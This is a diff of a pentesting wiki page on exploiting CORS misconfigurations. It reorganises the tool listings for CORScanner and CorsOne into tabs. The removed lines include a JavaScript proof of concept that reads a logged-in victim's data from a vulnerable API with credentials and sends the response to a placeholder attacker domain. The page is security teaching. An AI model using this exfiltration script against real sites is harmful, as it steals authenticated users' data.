@@ -75,41 +75,21 @@ During a penetration test, exploiting CORS misconfigurations is difficult. The a
 
 However, it's possible to get a Proof-of-Concept using JavaScript by registring a domain (to abuse a CORS misconfiguration).
 
+
 ### Tools
 
-The tool [CORScanner ](https://github.com/chenjj/CORScanner)is useful in finding misconfigurations. It relies on the table shown in the misconfiguration case 1.
+:::tabs
 
-```bash
-python cors_scan.py -u $URL
-```
+== CORScanner
 
-> [!TIP]
-> It is advised to use the verbose option `-v` to see the tests.
+The tool [CORScanner ](https://github.com/chenjj/CORScanner) is useful in finding misconfigurations. It relies on the table shown in the misconfiguration case 1.
 
-> [!WARNING]
-> It is possible to customize the third parties origins in the file `origins.json`.
+== CorsOne
 
-### Proof-of-Concept (PoC)
-
-To steal sensitive information, the victim has to be logged in the vulnerable website. From there, if the victim is redirected to the attacker's website (containing the script below), the sensitive information will be retrieved by the attacker.
-
-```javascript
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://vulnerable.domain/api/secret-data',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//atttacker.domain/log?response='+this.responseText; 
-};
-```
----
 The tool [CorsOne](https://github.com/omranisecurity/CorsOne) is a fast and accurate utility for detecting CORS misconfigurations, featuring multiple built-in test cases and automated checks for common bypass scenarios.
 
-```bash
-python3 CorsOne.py -u target.com
-```
+:::
+
 ---
 ## Resources
 
